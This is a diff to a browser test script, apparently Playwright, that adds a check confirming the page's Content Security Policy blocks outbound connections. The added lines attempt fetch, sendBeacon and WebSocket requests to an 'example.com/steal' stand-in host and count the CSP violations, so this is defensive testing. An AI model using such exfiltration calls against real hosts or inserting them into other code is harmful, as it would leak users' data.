@@ -321,6 +321,23 @@ await page.waitForTimeout(600);
 const fbTexts = await lastCard.locator('.preview-fallback').allInnerTexts();
 ok('URL未設定はプレビュー不可表示', fbTexts.some(t => t.includes('プレビュー不可')));
 
+// CSP: 実際に外へ出られないことを確認する。
+// 注意: sendBeacon は true を返し WebSocket は例外を投げないので、戻り値では判定できない。
+// ブラウザが拒否したかどうかは CSP の違反ログでしか分からない。
+const cspViolations = [];
+page.on('console', m => {
+  const t = m.text();
+  if (/Content Security Policy|Refused to connect/i.test(t)) cspViolations.push(t);
+});
+ok('CSP の meta がある', (await page.content()).includes('Content-Security-Policy'));
+await page.evaluate(async () => {
+  try { await fetch('https://example.com/steal'); } catch (e) {}
+  try { navigator.sendBeacon('https://example.com/steal', 'x'); } catch (e) {}
+  try { new WebSocket('wss://example.com/x'); } catch (e) {}
+});
+await page.waitForTimeout(600);
+ok('CSP が外部送信を拒否している (' + cspViolations.length + '件)', cspViolations.length >= 3);
+
 // AR-10: Tailwind が読めた/読めないの判定が働いているか
 const twState = await page.evaluate(() => ({
   noTw: document.documentElement.classList.contains('no-tw'),
